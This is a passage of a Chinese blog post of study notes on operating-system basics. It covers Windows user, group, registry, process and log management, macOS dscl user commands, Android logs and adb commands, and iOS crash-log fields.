Users：任何使用有效用户来登录此计算机的用户，都属于此组<br>11）Interactive:任何在本地登录（按ctrl+alt+del键登录）的用户，都属于此组<br>12）Network:任何通过网络来登录此计算机的用户，都属于此组</p><h3 id="组管理命令"><a href="#组管理命令" class="headerlink" title="组管理命令"></a>组管理命令</h3><p>1.net localgroup #show group table<br>2.net localgroup groupname #show group user<br>3.net localgroup groupname /add #add group<br>4.net localgroup groupname /del #del group<br>5.net localgroup groupname username /del # 从组中踢出用户<br>6.net localgroup groupname username /add # 添加用户到组</p><h3 id="内置账户"><a href="#内置账户" class="headerlink" title="内置账户"></a>内置账户</h3><p>1.administrator #管理员<br>2.system #系统账户，最高权限<br>3.local services #本地服务账户，user的权限<br>4.network services #网络服务账户 user权限<br>Tips：内置账号无法删除</p><h3 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><p>1.net user #show user table<br>2.net user username password #change password<br>3.net user username password /add #add user<br>4.net user username /del #delete user</p><h2 id="Windows文件系统"><a href="#Windows文件系统" class="headerlink" title="Windows文件系统"></a>Windows文件系统</h2><p>文件系统是操作系统用于再存储设备组织文件的方法。<br>从系统角度来看，文件系统是对文件存储设备的空间进行组织和分配，负责文件存储并对存入的文件进行保护和检索的系统。<br>每个驱动器都有自己的根目录结构，这样形成了多个树并列的情形，如图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190309112559820.png" alt="Windows文件系统结构"></p><h3 id="常见的文件系统"><a href="#常见的文件系统" class="headerlink" title="常见的文件系统"></a>常见的文件系统</h3><p>NTFS(最常用)<br>FAT32<br>FAT<br>ExFAT</p><p>FAT在软盘、闪存(U盘)，以及很多嵌入式设备上常见。<br>ExFAT(FAT64)，ExFAT是专门为闪存设计的文件系统，单个文件突破了4G的限制。ExFAT在windows、Linux、Mac系统上都是可以读写。</p><p>在稳定性和安全性方面，NTFS要优于FAT32，但是FAT32兼容较旧的存储设备及系统，如DOS系统等。两者的主要区别体现在：<br>1.FAT32最大只支持32G独立分区，NTFS最大支持的独立分区是2TB<br>2.FAT32不支持超过4G的单个文件<br>3.NTFS无法运行在DOS系统下，FAT32则可以兼容DOS系统</p><h2 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h2><p>Microsoft Windows 服务可以在 Windows 中长时间运行应用程序，非常适合需要长时间运行功能时使用。</p><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><p>注册表是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息，在运行中输入regedit即可进入。</p><p><img src="https://img-blog.csdnimg.cn/20190327075949591.png" alt="Windows注册表结构"></p><h3 id="注册表包括5个根键"><a href="#注册表包括5个根键" class="headerlink" title="注册表包括5个根键"></a>注册表包括5个根键</h3><p>1.HKEY_CLASSES_ROOT<br>说明：启动应用程序所需的全部信息。<br>2.HKEY_CURRENT_USER<br>说明：当前登录用户的配置信息。<br>3.HKEY_LOCAL_MACHINE<br>说明：本地计算机的系统信息，包括硬件和操作系统信息，安全数据和各类软件设置信息。<br>4.HKEY_USERS<br>说明：所有用户的配置数据，这些数据只有在用户登录系统时才能访问。<br>5.HKEY_CURRENT_CONFIG<br>说明：硬件的配置信息，从HKEY_LOCAL_MACHINE中映射出来。</p><h3 id="注册表基本数据类型"><a href="#注册表基本数据类型" class="headerlink" title="注册表基本数据类型"></a>注册表基本数据类型</h3><p>二进制值（reg_binary）:多数硬件信息以二进制数据存储，以十六进制格式显示在注册表编辑器中<br>字符串值（reg_sz）:包括字符串的注册表键，使用字符串数据类型<br>双字节值（reg_dword）:是32位信息常显示成4个字节。它在出错控制功能上用处极大，其数据一般以十六进制格式显示在注册<br>表编辑器中。<br>多字符串值(reg_multi_sz):将一系列项目作为单独的一个值。对于多种网络协议、多个项目、设备列表以及其他类似<br>的列表项目来说，可以使用多字符串值<br>可扩充字符串值（reg_expand_sz）：代表一个可扩展的字符串</p><h2 id="Windows进程"><a href="#Windows进程" class="headerlink" title="Windows进程"></a>Windows进程</h2><p>进程本质上是操作系统正在执行的一个程序</p><p><img src="/2021/06/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1.jpg" alt="Windows进程基础"></p><h3 id="常用进程管理命令"><a href="#常用进程管理命令" class="headerlink" title="常用进程管理命令"></a>常用进程管理命令</h3><p>1.netstat -ano | findstr 指定端口号 #查看指定端口的进程<br>2.taskkill /im cmd.exe #结束某进程<br>3.taskkill /pid pidnumber #结束pid为pidnumber的进程</p><h2 id="Windows设备管理"><a href="#Windows设备管理" class="headerlink" title="Windows设备管理"></a>Windows设备管理</h2><p>设备管理为了克服设备与cpu速度不匹配问题，使主机和设备并行工作</p><h2 id="Windows日志文件"><a href="#Windows日志文件" class="headerlink" title="Windows日志文件"></a>Windows日志文件</h2><p>Windows日志文件记录着Windows系统中所发生的一切<br>位置C:/windows/System32/winevt/Logs，运维人员建议修改日志默认位置<br>Windows日志：System.evtx<br>运行输入eventvwr进入事件查看器</p><p>入侵日志分析：利用Log Parser将日志文件导出为xlsx表格，分析攻击者的操作</p><h1 id="MAC-OS基础"><a href="#MAC-OS基础" class="headerlink" title="MAC OS基础"></a>MAC OS基础</h1><h2 id="日志与日志文件"><a href="#日志与日志文件" class="headerlink" title="日志与日志文件"></a>日志与日志文件</h2><p>系统日志文件 /var/log/system.log<br>cat -n app.log | grep “error”：查询日志中含有某个关键字error的信息，显示行号。</p><h2 id="MAC文件系统"><a href="#MAC文件系统" class="headerlink" title="MAC文件系统"></a>MAC文件系统</h2><p><img src="https://img.linux.net.cn/data/attachment/album/201807/02/094428ko2tc8saplc2apto.png" alt="标准 Unix 文件系统"></p><p>​                                                                                                     </p><h3 id="Mac文件目录"><a href="#Mac文件目录" class="headerlink" title="Mac文件目录"></a>Mac文件目录</h3><p>Linux有的文件Mac也有，但是是隐藏文件。</p><p>Mac特有目录：</p><ul><li>/Applications 应用程序默认安装路径</li><li>/Library 系统文件</li><li>/Network 网络节点存放</li><li>/System 只包含一个Library目录，存放了系统的绝大部分组件</li><li>/Users 存放用户的数据</li><li>/Volumes 存放挂载点</li><li>/cores 内核转储文件存放目录。当一个进程崩溃时，如果系统允许则会产生转储文件。</li><li>/private 存放了/tmp, /var, /etc等链接目录的目标目录。</li></ul><h3 id="Mac文件系统格式"><a href="#Mac文件系统格式" class="headerlink" title="Mac文件系统格式"></a>Mac文件系统格式</h3><p>HFS+、 APFS（最新的）</p><h2 id="Mac用户管理命令"><a href="#Mac用户管理命令" class="headerlink" title="Mac用户管理命令"></a>Mac用户管理命令</h2><p>dscl . -list /Users UniqueID（用户id）#查看用户<br>dscl . -list /Groups  PrimaryGroupID #查看用户组<br>dscl . -create /Users/sz UniqueID 888 #新建sz用户，id为888<br>dscl . -passwd /Users/sz 1234 #修改密码<br>dscl . -delete /Users/sz #删除用户<br>dscl . -create /Groups/mygroup #新建组<br>dscl . -append /Groups/mygroup groupMembership sz #把sz添加到组<br>dscl . -list /groups GroupMembership #查看所有组下的用户</p><h1 id="移动智能设备操作系统"><a href="#移动智能设备操作系统" class="headerlink" title="移动智能设备操作系统"></a>移动智能设备操作系统</h1><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><p>Android是基于Linux（不包含<a href="https://baike.baidu.com/item/GNU/671972">GNU</a>组件）的自由及开放源代码的操作系统</p><h3 id="Android日志与日志文件"><a href="#Android日志与日志文件" class="headerlink" title="Android日志与日志文件"></a>Android日志与日志文件</h3><p>Android有四类日志文件，分别是：main, system, radio和events。</p><p>main：应用程序日志<br>system：系统日志<br>radio：无线设备日志<br>events：诊断系统问题日志</p><h4 id="Logger日志格式"><a href="#Logger日志格式" class="headerlink" title="Logger日志格式"></a>Logger日志格式</h4><p>main、system和radio三种类型的日志格式是相同的。日志格式如下所示：</p><p><img src="https://pic1.zhimg.com/v2-a2f876631161fca1f52d5ae9910a18dc_b.jpg" alt="日志格式"></p><p>Priority：是一个整数，代表的是日志的优先级；<br>日志的优先级按重要程度不同划分为：VERBOSE、DEBUG、INFO、WARN、ERROR和FATAL六种。<br>tag：是一个字符串，代表的是日志的标签；<br>message：是一个字符串，代表的是日志的内容。</p><p>events类型日志没有优先级标签</p><h4 id="日志分析方法"><a href="#日志分析方法" class="headerlink" title="日志分析方法"></a>日志分析方法</h4><p>使用Logcat对Android系统log进行分析</p><h3 id="基本操作命令"><a href="#基本操作命令" class="headerlink" title="基本操作命令"></a>基本操作命令</h3><p>adb:Android 调试桥</p><p>adb shell  #进入Linuxshell模式<br>adb shell command #单条Linux命令<br>adb root #获取管理员权限<br>adb pull &lt;远程路径&gt; &lt;本地路径&gt; #从设备上下载文件到电脑<br>adb shell netcfg/ifconfig #show ip</p><h2 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h2><p>iOS属于类Unix的操作系统</p><h3 id="IOS日志与日志文件"><a href="#IOS日志与日志文件" class="headerlink" title="IOS日志与日志文件"></a>IOS日志与日志文件</h3><p><img src="/2021/06/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/1.png" alt="IOS日志与日志文件"></p><p>2.1进程信息<br>第一部分是闪退进程的相关信息：<br>Incident Identifier ： 是崩溃报告的唯一标识符<br>CrashReporter Key： 是与设备标识相对应的唯一键值。根据大量机子的出现频率可以判断是否是一个普遍的问题<br>Hardware Model ：标识设备类型。 如果很多崩溃日志都是来自相同的设备类型，说明只在某特定类型的设备上有问题<br>Process：操作权限<br>Path:崩溃文件的路径<br>Identifier:项目标识符<br>Version:版本号</p><p>2.2基本信息<br>这部分包括闪退发生的日期Date/Time和时间Launch Time，设备的iOS版本OS Version</p><p>2.3、异常信息<br>Exception Type:异常的类型<br>Exception Codes ：异常错误码<br>Termination Reason：闪退的原因<br>Triggered by Thread：出现问题在哪个线程，首先确定在哪个线程中出了问题，然后再去定位。</p><h3 id="基本操作命令-1"><a href="#基本操作命令-1" class="headerlink" title="基本操作命令"></a>基本操作命令</h3><p>Korn Shell(Unix Shell)</p><p>w #显示当前系统活动的总信息<br>df /tmp #显示文件系统的总空间和可用空间<br>uname -a #显示系统全部信息</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
